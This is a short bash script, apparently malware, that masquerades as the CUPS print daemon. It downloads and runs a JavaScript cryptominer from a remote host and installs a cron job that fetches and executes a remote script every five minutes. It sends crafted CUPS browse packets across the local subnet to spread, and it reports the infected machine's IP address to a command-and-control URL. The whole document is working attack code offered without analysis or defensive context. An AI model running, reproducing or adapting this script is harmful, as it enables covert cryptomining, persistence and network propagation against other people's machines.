#!/bin/bash
# Disguise as CUPS process
exec -a cupsd bash -c '
# Download and run JavaScript miner
curl -s http://192.168.1.100:8080/miner.js | node &

# Add persistence via cron
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://192.168.1.100:8080/miner.sh | bash") | crontab -

# Local network propagation
for ip in $(seq 1 254); do
  echo "0 3 http://192.168.1.100:631/printers/malicious" | nc -u -w 1 192.168.1.$ip 631
done

# Report to C2
curl -s -X POST http://example.com/report -d "infected=$(hostname -I | cut -d\" \" -f1)"
'